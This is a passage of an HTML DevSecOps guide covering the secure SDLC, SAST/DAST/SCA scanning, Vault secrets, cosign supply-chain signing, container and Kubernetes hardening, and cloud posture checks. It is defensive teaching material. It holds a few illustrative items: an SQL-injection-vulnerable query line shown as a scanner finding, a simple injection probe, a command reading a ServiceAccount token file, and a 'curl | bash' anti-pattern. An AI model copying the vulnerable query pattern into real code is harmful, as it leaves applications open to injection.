+<h2 id="secure-sdlc">4. Security in the SDLC</h2>
+<p class="section-intro">Every phase of development gets its own automated security controls.</p>
+<table>
+  <tr><th>Phase</th><th>Control</th></tr>
+  <tr><td>Code</td><td>Secret scanning (gitleaks), pre-commit hooks, secure coding, code review</td></tr>
+  <tr><td>Build</td><td>SCA (dependency scanning), SAST, SBOM generation</td></tr>
+  <tr><td>Test</td><td>DAST against a running app, container image scanning</td></tr>
+  <tr><td>Deploy</td><td>Image signing verification, policy admission control, IaC scanning</td></tr>
+  <tr><td>Operate</td><td>Runtime detection, CSPM, vulnerability re-scanning, audit logs</td></tr>
+</table>
+
+<h4>Why a secure SDLC exists</h4>
+<p>A single scan at one point in time only catches the bugs visible at that point. Vulnerabilities enter at every phase — a bad design decision, a typo in code, a vulnerable dependency pulled in at build, a misconfigured deploy, a CVE disclosed <em>after</em> you shipped. The secure SDLC exists because each phase has a distinct threat surface, and the cheapest place to catch a given class of flaw is the phase where it is introduced. Layering controls across phases is defense-in-depth applied to the delivery pipeline itself.</p>
+
+<h4>How the controls chain together</h4>
+<p>The controls form a ratchet: each phase assumes the previous ones can fail. Secret scanning at commit catches leaks before they hit history; SAST at build catches injection patterns the developer missed; SCA catches a vulnerable library the developer didn't know was transitive; image scanning catches OS-level CVEs the app author never touched; admission control at deploy refuses anything unsigned even if every earlier gate was bypassed; runtime detection catches the exploit of a zero-day that no scanner could have known about. No single layer is trusted to be complete.</p>
+
+<div class="code-label label-yaml">One pipeline, controls at each phase</div>
+<pre><code>stages:
+  - code:    { run: "gitleaks detect &amp;&amp; pre-commit run --all-files" }
+  - build:   { run: "trivy fs --exit-code 1 --severity HIGH,CRITICAL . &amp;&amp; semgrep ci &amp;&amp; syft . -o spdx-json &gt; sbom.json" }
+  - test:    { run: "zap-baseline.py -t https://staging.example.com" }
+  - release: { run: "cosign sign --key env://COSIGN_KEY $IMAGE" }
+  - deploy:  { run: "kubectl apply -f k8s/  # Kyverno admission verifies signature" }
+  - operate: { run: "falco &amp;  # runtime detection, + nightly 'trivy image' re-scan" }</code></pre>
+
+<div class="box warn"><span class="box-title">Common secure-SDLC mistakes</span><ul><li><strong>Only scanning at build.</strong> A CVE disclosed after release means yesterday's "clean" image is today's vulnerable one — you need scheduled re-scanning in Operate.</li><li><strong>Gates that don't actually block.</strong> A scan whose result is ignored is theater. At minimum, high/critical must fail the build.</li><li><strong>No feedback loop to the author.</strong> Findings surfacing days later in a separate tool get ignored; put them in the PR.</li><li><strong>Design phase skipped.</strong> Threat modeling (§3) is the "shift-left-est" control and the one most often omitted.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: quality control on an assembly line</span><p>You don't inspect a car only after it rolls off the line — you check the welds, then the paint, then the electronics, then a final road test. Each station catches the defects it's best positioned to see. The secure SDLC puts a security inspector at every station instead of one overwhelmed inspector at the exit.</p></div>
+
+<h2 id="sast-dast">5. SAST, DAST &amp; SCA</h2>
+<p class="section-intro">The three pillars of automated application security scanning — each finds different classes of problems.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 280" role="img" aria-label="SAST versus DAST versus SCA comparison of what each scans">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">SAST vs DAST vs SCA — three tools, three different artifacts</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="30" y="60" width="240" height="180" rx="10" fill="#21262d" stroke="#58a6ff"/>
+    <text x="150" y="86" text-anchor="middle" class="svg-label" fill="#58a6ff">SAST — static</text>
+    <text x="150" y="112" text-anchor="middle" class="svg-sub">reads your source (AST +</text>
+    <text x="150" y="130" text-anchor="middle" class="svg-sub">taint flow: source→sink)</text>
+    <text x="150" y="158" text-anchor="middle" class="svg-sub">finds: injection, hardcoded</text>
+    <text x="150" y="176" text-anchor="middle" class="svg-sub">secrets, insecure patterns</text>
+    <text x="150" y="208" text-anchor="middle" class="svg-sub">✓ all code paths</text>
+    <text x="150" y="226" text-anchor="middle" class="svg-sub">✗ no runtime context</text>
+
+    <rect x="290" y="60" width="240" height="180" rx="10" fill="#21262d" stroke="#7ee787"/>
+    <text x="410" y="86" text-anchor="middle" class="svg-label" fill="#7ee787">SCA — composition</text>
+    <text x="410" y="112" text-anchor="middle" class="svg-sub">reads lockfiles / layers,</text>
+    <text x="410" y="130" text-anchor="middle" class="svg-sub">resolves transitive tree</text>
+    <text x="410" y="158" text-anchor="middle" class="svg-sub">finds: known CVEs in the</text>
+    <text x="410" y="176" text-anchor="middle" class="svg-sub">libraries you import</text>
+    <text x="410" y="208" text-anchor="middle" class="svg-sub">✓ matches NVD / OSV</text>
+    <text x="410" y="226" text-anchor="middle" class="svg-sub">✗ not your own bugs</text>
+
+    <rect x="550" y="60" width="240" height="180" rx="10" fill="#21262d" stroke="#f0883e"/>
+    <text x="670" y="86" text-anchor="middle" class="svg-label" fill="#f0883e">DAST — dynamic</text>
+    <text x="670" y="112" text-anchor="middle" class="svg-sub">attacks the running app</text>
+    <text x="670" y="130" text-anchor="middle" class="svg-sub">over HTTP (black box)</text>
+    <text x="670" y="158" text-anchor="middle" class="svg-sub">finds: real exploitable</text>
+    <text x="670" y="176" text-anchor="middle" class="svg-sub">flaws, misconfig, authn</text>
+    <text x="670" y="208" text-anchor="middle" class="svg-sub">✓ proves exploitability</text>
+    <text x="670" y="226" text-anchor="middle" class="svg-sub">✗ only reachable paths</text>
+  </g>
+</svg>
+<figcaption>They inspect different artifacts with different techniques — source, dependencies, and the live app — which is why mature programs run all three. They are complementary, not substitutes.</figcaption>
+</figure>
+<table>
+  <tr><th>Type</th><th>What it scans</th><th>Finds</th><th>Tools</th></tr>
+  <tr><td><strong>SAST</strong></td><td>Your source code (static)</td><td>Injection, hardcoded secrets, insecure patterns</td><td>Semgrep, SonarQube, CodeQL</td></tr>
+  <tr><td><strong>SCA</strong></td><td>Your dependencies</td><td>Known CVEs in libraries you import</td><td>Dependabot, Trivy, Snyk</td></tr>
+  <tr><td><strong>DAST</strong></td><td>The running app (dynamic)</td><td>Runtime flaws, misconfig, auth issues</td><td>OWASP ZAP, Burp</td></tr>
+</table>
+<div class="code-label label-yaml">Scanning in CI (fail on high severity)</div>
+<pre><code>- name: Secret scan
+  run: gitleaks detect --no-banner
+- name: Dependency + image scan (SCA)
+  run: trivy fs --severity HIGH,CRITICAL --exit-code 1 .
+- name: SAST
+  run: semgrep ci        # fails on findings per your ruleset</code></pre>
+<div class="box warn"><span class="box-title">Tune out the noise or lose the team</span><p>Scanners produce false positives. If every build fails on low-severity noise, developers disable them. Start by failing only on <strong>high/critical</strong>, triage findings, maintain an allow-list for accepted risks, and tighten over time. Actionable signal beats overwhelming noise.</p></div>
+
+<h4>How SAST, DAST and SCA differ mechanically</h4>
+<p>They are not three brands of the same thing — they inspect fundamentally different artifacts using different techniques, which is why mature programs run all three:</p>
+<ul>
+<li><strong>SAST</strong> parses your source into an abstract syntax tree (AST) and often a data-flow/taint graph. It traces whether untrusted input (a "source" like <code>request.body</code>) reaches a dangerous "sink" (like <code>db.query()</code>) without passing through a sanitizer. It sees <em>all</em> code paths, including ones tests never hit — but it has no runtime context, so it produces false positives.</li>
+<li><strong>SCA</strong> doesn't analyze your code at all — it reads your dependency manifests/lockfiles (<code>package-lock.json</code>, <code>go.sum</code>, image layers), resolves the full transitive tree, and matches each component+version against vulnerability databases (NVD, GitHub Advisories, OSV). It answers "am I shipping a library with a known CVE?"</li>
+<li><strong>DAST</strong> is a black box — it doesn't see code, it <em>attacks the running app</em> over HTTP, sending malicious payloads (SQLi strings, XSS vectors, auth-bypass attempts) and observing responses. It finds real, exploitable, runtime issues (including misconfig and auth flaws) but only on the paths it can reach and only after the app is deployed.</li>
+</ul>
+
+<div class="code-label label-cmd">The same SQL-injection bug seen by each tool</div>
+<pre><code># SAST (Semgrep) — sees the tainted string reach the query at build time:
+semgrep --config=p/sql-injection app.py
+#   app.py:14  Detected user input in SQL string. Use parameterized queries.
+#              cursor.execute("SELECT * FROM users WHERE id = " + request.args['id'])
+
+# SCA (Trivy) — sees a vulnerable driver, unrelated to your code:
+trivy fs .
+#   sqlparse 0.4.1  CVE-2023-30608  HIGH  fixed in 0.4.4
+
+# DAST (OWASP ZAP) — proves it's exploitable on the running app:
+zap-cli quick-scan http://localhost:8000
+#   High: SQL Injection at GET /user?id=1'  (DB error surfaced in response)</code></pre>
+
+<div class="box danger"><span class="box-title">Common SAST/DAST/SCA mistakes</span><ul><li><strong>Relying on one type.</strong> SAST misses runtime/config flaws; DAST misses unreachable-but-real code paths; SCA misses your own bugs. They are complementary, not substitutes.</li><li><strong>Running DAST against production</strong> without care — it sends real attack payloads and can create junk data or trigger DoS. Point it at staging.</li><li><strong>Ignoring transitive dependencies.</strong> Most CVEs come from libraries your libraries pulled in, not your direct deps.</li><li><strong>Treating SCA "vulnerable" as "exploitable."</strong> Use reachability analysis / the SBOM to prioritize CVEs on code paths you actually use.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: three ways to check a house is safe</span><p>SAST is an architect reading the blueprints for design flaws. SCA is checking whether any appliances you installed have been recalled. DAST is a locksmith who actually walks up and tries every door and window. You want all three — the blueprint review won't catch a recalled toaster, and the locksmith won't read blueprints.</p></div>
+
+<h2 id="secrets">6. Secrets Management</h2>
+<p class="section-intro">Hardcoded secrets are the most common serious leak. Never store credentials in code, images, or plain env files in the repo.</p>
+<figure class="diagram">
+<svg viewBox="0 0 820 200" role="img" aria-label="App fetches secrets from a vault at runtime">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Secrets fetched at runtime, never baked in</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="60" y="75" width="160" height="55" rx="8" fill="#21262d" stroke="#7ee787"/><text x="140" y="108" text-anchor="middle" class="svg-sub">app / pod</text>
+    <rect x="330" y="75" width="180" height="55" rx="8" fill="#21262d" stroke="#d13438" stroke-width="2"/><text x="420" y="100" text-anchor="middle" class="svg-label" fill="#ff6b6f">Vault / Secrets Mgr</text><text x="420" y="118" text-anchor="middle" class="svg-sub">short-lived, audited</text>
+    <rect x="620" y="75" width="150" height="55" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="695" y="108" text-anchor="middle" class="svg-sub">database</text>
+    <g stroke="#58a6ff" stroke-width="2"><line x1="220" y1="102" x2="328" y2="102" marker-end="url(#se)"/><line x1="510" y1="102" x2="618" y2="102" marker-end="url(#se)"/></g>
+    <text x="275" y="92" text-anchor="middle" class="svg-sub">authn</text>
+    <text x="410" y="170" text-anchor="middle" class="svg-sub">The secret lives only in memory at runtime, is rotated automatically, and every access is logged.</text>
+  </g>
+  <defs><marker id="se" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#58a6ff"/></marker></defs>
+</svg>
+<figcaption>Apps authenticate to a secrets manager and fetch credentials at runtime. Nothing sensitive is stored in code, images, or Git.</figcaption>
+</figure>
+<div class="box best"><span class="box-title">Secrets hierarchy of good→best</span><ol>
+  <li>Secrets in a manager (Vault, AWS Secrets Manager), injected at runtime.</li>
+  <li><strong>Dynamic secrets</strong> — short-lived credentials generated per-request, auto-expiring.</li>
+  <li>Rotate regularly and on any suspicion; audit every access.</li>
+  <li>Scan repos &amp; history for leaks (gitleaks); if leaked, <strong>rotate immediately</strong> — removing from Git history is not enough.</li>
+</ol></div>
+
+<h4>Why secrets management exists</h4>
+<p>A secret in source code is a secret shared with everyone who ever cloned the repo, every CI runner, every backup, every fork, and — via the Git history — everyone forever, even after you "delete" it. Secrets management exists to break the link between "the app can use the credential" and "the credential is copied everywhere." The goal is that a credential lives in exactly one authoritative place, is handed to workloads just-in-time, and every access is logged so you can answer "who used this and when?"</p>
+
+<h4>How runtime secret injection works under the hood</h4>
+<p>The app never holds a static credential. Instead it proves <em>who it is</em> using an identity it already has — a Kubernetes ServiceAccount token, an AWS IAM role, a cloud instance identity document — and exchanges that identity for a secret. The secrets manager verifies the identity against a policy ("the <code>payments/api</code> service account may read <code>db/creds</code>"), returns the secret over TLS into process memory, and logs the access. Nothing sensitive touches disk, the image, or Git.</p>
+
+<div class="code-label label-cmd">Kubernetes workload fetches a secret by proving its identity (no static token)</div>
+<pre><code># The pod presents its ServiceAccount JWT; Vault verifies it with the K8s API,
+# maps it to a policy, and returns a secret — all at startup, in memory:
+JWT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+vault write auth/kubernetes/login role=payments-api jwt="$JWT"
+#   token: hvs.CAES...        (a short-lived Vault token, not the DB password)
+vault kv get -field=password secret/payments/db
+#   s3cr3t-rotated-nightly    (delivered over TLS, never written to disk)</code></pre>
+<div class="code-label label-output">The audit trail every access produces</div>
+<pre><code>{"time":"2026-09-27T14:31Z","type":"response","auth":{"display_name":"payments-api"},
+ "request":{"operation":"read","path":"secret/payments/db"},"remote_address":"10.1.4.7"}</code></pre>
+
+<div class="box danger"><span class="box-title">Common secrets mistakes</span><ul><li><strong>Hardcoded secrets</strong> in code, Dockerfiles (<code>ENV DB_PASS=...</code>), or CI YAML committed to the repo — the #1 real-world leak.</li><li><strong>"It's in a private repo, so it's fine."</strong> Private repos get forked, cloned to laptops, and made public by accident. Treat any secret in Git as compromised.</li><li><strong>Base64 == encryption.</strong> Kubernetes Secrets are base64-<em>encoded</em>, not encrypted; anyone with <code>get secret</code> RBAC reads them in plaintext. Enable etcd encryption + use a real manager.</li><li><strong>Deleting a leaked secret from the latest commit</strong> — it's still in history and on every clone. You must <em>rotate</em> the actual credential.</li><li><strong>Passing secrets as build args</strong> — they get baked into image layers and leak via <code>docker history</code>.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: hotel key cards vs a master key under the mat</span><p>Hardcoding a secret is leaving the master key under the doormat — anyone who knows to look gets in forever. A secrets manager is the front desk: you show ID, they issue a key card that opens only your room and stops working at checkout, and every use is logged. Lost cards are trivially deactivated; a lost master key means re-keying the whole building.</p></div>
+
+<h2 id="supply-chain">7. Supply Chain Security</h2>
+<p class="section-intro">Attackers increasingly target the build pipeline and dependencies rather than the app directly. Prove what you build and verify what you run.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 260" role="img" aria-label="SLSA sign and verify supply chain flow">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Sign at build → record in transparency log → verify at deploy</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="24" y="80" width="150" height="70" rx="8" fill="#21262d" stroke="#7ee787"/><text x="99" y="108" text-anchor="middle" class="svg-label">CI build</text><text x="99" y="127" text-anchor="middle" class="svg-sub">OIDC identity,</text><text x="99" y="143" text-anchor="middle" class="svg-sub">SBOM + provenance</text>
+    <rect x="230" y="80" width="150" height="70" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="305" y="108" text-anchor="middle" class="svg-label">cosign sign</text><text x="305" y="127" text-anchor="middle" class="svg-sub">keyless, short-lived</text><text x="305" y="143" text-anchor="middle" class="svg-sub">cert (Fulcio)</text>
+    <rect x="436" y="80" width="150" height="70" rx="8" fill="#21262d" stroke="#f0883e"/><text x="511" y="108" text-anchor="middle" class="svg-label">Rekor log</text><text x="511" y="127" text-anchor="middle" class="svg-sub">public, append-only</text><text x="511" y="143" text-anchor="middle" class="svg-sub">transparency log</text>
+    <rect x="642" y="80" width="154" height="70" rx="8" fill="#21262d" stroke="#d13438" stroke-width="2"/><text x="719" y="108" text-anchor="middle" class="svg-label" fill="#ff6b6f">Admission</text><text x="719" y="127" text-anchor="middle" class="svg-sub">verify signature +</text><text x="719" y="143" text-anchor="middle" class="svg-sub">provenance → allow</text>
+    <g stroke="#8b949e" stroke-width="1.5">
+      <line x1="174" y1="115" x2="228" y2="115" marker-end="url(#sec-slsa)"/>
+      <line x1="380" y1="115" x2="434" y2="115" marker-end="url(#sec-slsa)"/>
+      <line x1="586" y1="115" x2="640" y2="115" marker-end="url(#sec-slsa)"/>
+    </g>
+    <text x="410" y="195" text-anchor="middle" class="svg-sub" fill="#ff7b72">An unsigned or tampered image fails at admission and never runs.</text>
+    <text x="410" y="222" text-anchor="middle" class="svg-sub">Provenance lets you require "built by OUR CI from OUR main branch" — not merely "signed by someone".</text>
+  </g>
+  <defs><marker id="sec-slsa" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>Keyless signing ties the signature to the build's OIDC identity and records it in a public transparency log. Admission control refuses anything that fails verification.</figcaption>
+</figure>
+<div class="box note"><span class="box-title">The four defenses</span><ul>
+  <li><strong>SBOM</strong> — know every component in your artifacts (answer "are we affected by CVE-X?" instantly).</li>
+  <li><strong>Signing</strong> — cryptographically sign artifacts (cosign) so tampering is detectable.</li>
+  <li><strong>Provenance (SLSA)</strong> — a signed record of how/where an artifact was built.</li>
+  <li><strong>Verification</strong> — admission controllers refuse unsigned/unknown images.</li>
+</ul><p>Full walkthrough with commands in the <a href="cicd-complete-guide.html#supply-chain-slsa">CI/CD supply-chain section</a> and <a href="docker-complete-guide.html#supply-chain">Docker SBOM section</a>.</p></div>
+
+<h4>Why supply chain security exists</h4>
+<p>Modern apps are mostly other people's code — a typical service is 80–90% third-party dependencies by line count. Attackers noticed that compromising one popular library or build server infects thousands of downstream victims at once (SolarWinds, Codecov, the <code>event-stream</code> and <code>xz</code> backdoors, dependency-confusion attacks). Supply chain security exists because your app is only as trustworthy as the least-trustworthy thing that went into building it — including the build system itself.</p>
+
+<h4>How signing and verification actually work</h4>
+<p>Signing uses asymmetric crypto: the build system hashes the artifact and encrypts that hash with a <em>private</em> key, producing a signature. Anyone can verify it with the corresponding <em>public</em> key — if the artifact were tampered with, its hash wouldn't match and verification fails. Modern "keyless" signing (Sigstore/cosign) removes the burden of managing private keys: it gets a short-lived certificate tied to an OIDC identity (e.g., the GitHub Actions workflow), signs, and records everything in a public transparency log (Rekor) so tampering with the record itself is detectable. <strong>SLSA provenance</strong> adds a signed statement of <em>how</em> the artifact was built (source repo, commit, builder), so you can require "built by our trusted CI from our main branch" — not just "signed by someone."</p>
+
+<div class="code-label label-cmd">Sign at build, verify at deploy (keyless cosign)</div>
+<pre><code># In CI (identity comes from the workflow's OIDC token — no key to leak):
+cosign sign --yes ghcr.io/acme/api@sha256:abc123...
+#   tlog entry created at index 90210423   (recorded in Rekor transparency log)
+
+# At deploy / admission time — reject anything not signed by our CI:
+cosign verify \
+  --certificate-identity-regexp "https://github.com/acme/.*" \
+  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
+  ghcr.io/acme/api@sha256:abc123...
+#   Verified OK   → allowed to run
+# An unsigned or tampered image fails here and never deploys.</code></pre>
+
+<div class="box warn"><span class="box-title">Common supply-chain mistakes</span><ul><li><strong>Trusting mutable tags.</strong> <code>image:latest</code> can point to anything tomorrow. Pin by digest (<code>@sha256:...</code>) so what you verified is what you run.</li><li><strong>Dependency confusion.</strong> If your internal package name isn't reserved on the public registry, an attacker publishes a higher version and your build pulls theirs. Use scoped names + a private registry with a lockfile.</li><li><strong>Signing but never verifying.</strong> A signature nobody checks is decoration. Enforce verification at admission.</li><li><strong>No SBOM.</strong> When the next <code>log4shell</code> drops, "are we affected?" should take seconds, not a week of grepping.</li><li><strong>Unpinned/curl-piped build tooling</strong> — <code>curl | bash</code> in CI runs whatever the server serves that day.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a tamper-evident seal + ingredients label</span><p>An SBOM is the ingredients label on the package — you can instantly check for the ingredient that just got recalled. The signature is the tamper-evident seal — if it's broken, you don't eat it. Provenance is the certificate saying "made in our inspected factory, not a random garage." Together they let you trust food you didn't grow yourself.</p></div>
+
+<h2 id="container-security">8. Container &amp; Image Security</h2>
+<table>
+  <tr><th>Control</th><th>Why</th></tr>
+  <tr><td>Minimal base images (distroless/slim)</td><td>Fewer packages = fewer CVEs &amp; smaller attack surface</td></tr>
+  <tr><td>Run as non-root, read-only filesystem</td><td>Limits what a compromised container can do</td></tr>
+  <tr><td>Scan images in CI (Trivy/Grype)</td><td>Block known-vulnerable images from shipping</td></tr>
+  <tr><td>Pin base images by digest</td><td>Prevents silent, unreviewed base changes</td></tr>
+  <tr><td>Drop Linux capabilities</td><td>Least privilege at the kernel level</td></tr>
+</table>
+<div class="box note"><span class="box-title">Deep dives elsewhere</span><p>Hardened Dockerfiles, distroless, non-root, and SBOM/scanning are covered hands-on in the <a href="docker-complete-guide.html#distroless">Docker guide</a>. The <a href="linux-complete-guide.html#namespaces-cgroups">Linux namespaces/cgroups section</a> explains <em>why</em> <code>--privileged</code> is dangerous (it strips the isolation that makes containers safe).</p></div>
+
+<h4>Why container security is its own discipline</h4>
+<p>A container is not a VM. It's just a Linux process wearing a disguise made of <strong>namespaces</strong> (which give it its own view of PIDs, network, mounts, users) and <strong>cgroups</strong> (which limit its CPU/memory). Crucially, it shares the <em>host kernel</em> with every other container. That means a kernel vulnerability or a misconfiguration that weakens the disguise can let a process step out onto the host. Container security exists to keep the disguise strong and to minimize the damage if it slips.</p>
+
+<h4>How the hardening controls work under the hood</h4>
+<ul>
+<li><strong>Non-root user</strong>: if the process runs as UID 0 inside the container and escapes a namespace, it's root on the host. Running as an unprivileged UID means an escape lands as a nobody.</li>
+<li><strong>Dropped capabilities</strong>: Linux splits root's power into ~40 capabilities. A web server needs almost none. Dropping <code>ALL</code> and adding back only <code>NET_BIND_SERVICE</code> removes the kernel powers (<code>CAP_SYS_ADMIN</code>, <code>CAP_SYS_PTRACE</code>) that escapes rely on.</li>
+<li><strong>Read-only root filesystem</strong>: an attacker who lands can't drop a binary or modify the app if the filesystem rejects writes.</li>
+<li><strong>Minimal/distroless base</strong>: no shell, no package manager, no <code>curl</code> means the attacker's toolkit isn't already installed for them, and there are far fewer CVEs to patch.</li>
+<li><strong>Pin by digest</strong>: guarantees the exact bytes you scanned are the exact bytes that run.</li>
+</ul>
+
+<div class="code-label label-yaml">A hardened pod securityContext</div>
+<pre><code>securityContext:
+  runAsNonRoot: true
+  runAsUser: 10001
+  allowPrivilegeEscalation: false        # blocks setuid-based escalation
+  readOnlyRootFilesystem: true
+  capabilities:
+    drop: ["ALL"]
+    add:  ["NET_BIND_SERVICE"]           # only if you must bind &lt;1024
+  seccompProfile: { type: RuntimeDefault } # filters dangerous syscalls</code></pre>
+<div class="code-label label-cmd">Scan and prove the image before shipping</div>
+<pre><code>trivy image --severity HIGH,CRITICAL --exit-code 1 acme/api:1.4.2
+#   Total: 0 (HIGH: 0, CRITICAL: 0)   → passes
+docker history acme/api:1.4.2 --no-trunc | grep -i secret   # ensure no baked secrets</code></pre>
+
+<div class="box danger"><span class="box-title">Common container mistakes</span><ul><li><strong>Running as root</strong> (the default!) — always set a non-root user.</li><li><strong><code>--privileged</code> or mounting <code>/var/run/docker.sock</code></strong> — both are effectively host root. (See §23.)</li><li><strong>Fat base images</strong> (<code>ubuntu</code>, full <code>node</code>) dragging in hundreds of CVEs and a full shell for the attacker.</li><li><strong>Secrets in <code>ENV</code> or build args</strong> — visible via <code>docker inspect</code>/<code>docker history</code>.</li><li><strong>Never re-scanning.</strong> An image clean at build accumulates CVEs as new ones are disclosed.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: apartments vs houses</span><p>VMs are separate houses — each with its own foundation and plumbing (kernel). Containers are apartments in one building sharing the same foundation. Cheaper and faster, but a fire in one unit (a kernel exploit) threatens the whole building. So you add fire doors and sprinklers (non-root, dropped capabilities, seccomp) — and for truly dangerous tenants you give them a standalone house (gVisor/Kata, §23).</p></div>
+
+<h2 id="k8s-security">9. Kubernetes Security</h2>
+<figure class="diagram">
+<svg viewBox="0 0 820 220" role="img" aria-label="Kubernetes security layers">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Layered Kubernetes controls (defense in depth)</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="120" y="45" width="580" height="30" rx="6" fill="#21262d" stroke="#d13438"/><text x="410" y="65" text-anchor="middle" class="svg-sub">RBAC — who can do what in the cluster</text>
+    <rect x="150" y="82" width="520" height="30" rx="6" fill="#21262d" stroke="#f0883e"/><text x="410" y="102" text-anchor="middle" class="svg-sub">Pod Security Standards — no privileged/root pods</text>
+    <rect x="180" y="119" width="460" height="30" rx="6" fill="#21262d" stroke="#58a6ff"/><text x="410" y="139" text-anchor="middle" class="svg-sub">NetworkPolicies — default-deny pod traffic</text>
+    <rect x="210" y="156" width="400" height="30" rx="6" fill="#21262d" stroke="#7ee787"/><text x="410" y="176" text-anchor="middle" class="svg-sub">Admission control (OPA/Kyverno) — enforce policy</text>
+  </g>
+</svg>
+<figcaption>No single control secures a cluster. Layer RBAC, Pod Security, NetworkPolicies, and admission control — each covered in the <a href="kubernetes-complete-guide.html#rbac">Kubernetes security sections</a>.</figcaption>
+</figure>
+<div class="box best"><span class="box-title">Kubernetes hardening checklist</span><ul>
+  <li>Least-privilege <strong>RBAC</strong>; no wildcard cluster-admin for apps.</li>
+  <li><strong>Pod Security Standards</strong> at "restricted" — no privileged, no root, no host mounts.</li>
+  <li><strong>Default-deny NetworkPolicies</strong>, then allow only needed flows.</li>
+  <li><strong>Admission control</strong> (Kyverno/OPA Gatekeeper) to enforce signed images, resource limits, labels.</li>
+  <li>Secrets in a real manager (External Secrets Operator), not base64 in etcd.</li>
+  <li>Keep the cluster patched; scan node OS too.</li>
+</ul></div>
+
+<h4>Why Kubernetes needs layered security</h4>
+<p>Kubernetes is a distributed system with a powerful API that can create workloads, mount volumes, and read secrets across a whole fleet. Its defaults favor ease-of-use over safety: pods can run as root, talk to any other pod, and auto-mount a token to the API server. Each layer (RBAC, Pod Security, NetworkPolicy, admission control) closes a different attack path, so a single misconfiguration doesn't hand over the cluster.</p>
+
+<h4>How the layers stop an attack chain</h4>
+<p>Trace a realistic compromise and see which layer catches it: an attacker exploits an app and gets code execution in a pod. <strong>NetworkPolicy</strong> (default-deny) stops them scanning/reaching other services. <strong>Pod Security Standards</strong> (restricted) means the pod isn't privileged and isn't root, so kernel-escape paths are closed. The auto-mounted <strong>ServiceAccount token</strong> — if you disabled automount or scoped RBAC tightly — can't list secrets or create pods. <strong>Admission control</strong> already refused to run the pod if it was privileged or unsigned in the first place. Each layer assumes the one before it failed.</p>
+
+<div class="code-label label-cmd">Find the dangerous defaults in your cluster</div>
+<pre><code># Who can do anything (cluster-admin) — should be a very short list:
+kubectl get clusterrolebindings -o json | \
+  jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]?.name'
+
+# Pods running as root or privileged (should be none in prod):
+kubectl get pods -A -o json | jq -r '.items[]
+  | select(.spec.containers[].securityContext.privileged==true)
+  | "\(.metadata.namespace)/\(.metadata.name) PRIVILEGED"'
+
+# Can this service account read secrets it shouldn't?
+kubectl auth can-i get secrets --as=system:serviceaccount:default:default
+#   no    ← what you want</code></pre>
+
+<div class="box danger"><span class="box-title">Common Kubernetes security mistakes</span><ul><li><strong>Wildcard RBAC</strong> (<code>verbs: ["*"], resources: ["*"]</code>) or binding apps to <code>cluster-admin</code> "to make it work."</li><li><strong>No NetworkPolicy</strong> — by default every pod can reach every other pod, so one foothold sees everything.</li><li><strong>Leaving the default ServiceAccount token automounted</strong> when the app doesn't call the API.</li><li><strong>Storing real secrets as Kubernetes Secrets without etcd encryption</strong> — they're just base64.</li><li><strong>No admission control</strong>, so a privileged or unsigned pod runs unchallenged.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a secure office building</span><p>RBAC is your keycard's access list (which doors you may open). Pod Security is the rule that nobody brings dangerous equipment inside. NetworkPolicy is the interior locked doors between departments. Admission control is the security guard at the entrance who turns away anyone without a badge <em>before</em> they get in. Any one alone is bypassable; together they're a real building.</p></div>
+
+<h2 id="cloud-security">10. Cloud Security &amp; CSPM</h2>
+<p class="section-intro">Most cloud breaches are misconfigurations, not exploits. Cloud Security Posture Management (CSPM) continuously checks for them.</p>
+<table>
+  <tr><th>Risk</th><th>Control</th></tr>
+  <tr><td>Public S3 buckets / open ports</td><td>CSPM tools (Prowler, ScoutSuite, AWS Security Hub) + Block Public Access</td></tr>
+  <tr><td>Over-broad IAM</td><td>Access Analyzer, least-privilege reviews</td></tr>
+  <tr><td>No audit trail</td><td>CloudTrail on, centralized &amp; immutable</td></tr>
+  <tr><td>Unencrypted data</td><td>KMS encryption by default, enforced by policy</td></tr>
+  <tr><td>Threats in logs</td><td>GuardDuty / equivalent</td></tr>
+</table>
+<div class="box note"><span class="box-title">Foundations in the Cloud guide</span><p>The <a href="cloud-aws-complete-guide.html#security">Cloud/AWS security section</a> covers IAM, KMS, CloudTrail, and GuardDuty. The key mindset from its <a href="cloud-aws-complete-guide.html#shared-resp">shared-responsibility model</a>: AWS secures the cloud; securing what you put in it is on you.</p></div>
+
+<h4>Why cloud posture management exists</h4>
+<p>In the cloud, a security boundary is one API call away from changing. A single <code>PutBucketAcl</code> can make terabytes public; one over-broad IAM policy can grant an intern's key access to production. There's no physical firewall to hide behind — the control plane <em>is</em> the perimeter. CSPM exists because humans make these misconfigurations constantly, and you need something watching every account, every region, continuously, to catch drift before an attacker (or a researcher's scanner) does.</p>
+
+<h4>How CSPM works under the hood</h4>
+<p>A CSPM tool assumes a read-only role in each account, enumerates resources via the provider APIs (<code>s3:GetBucketPolicy</code>, <code>ec2:DescribeSecurityGroups</code>, <code>iam:GetAccountAuthorizationDetails</code>), and evaluates each against a rule set (CIS Benchmark, provider best practices). It's essentially policy-as-code applied to live infrastructure: "flag any bucket with public read," "flag any security group open to <code>0.0.0.0/0</code> on 22." The best setups also scan the <em>Terraform/CloudFormation</em> before apply (Checkov, tfsec) so the misconfig never reaches the account.</p>
+
+<div class="code-label label-cmd">Prowler: audit an AWS account against CIS</div>
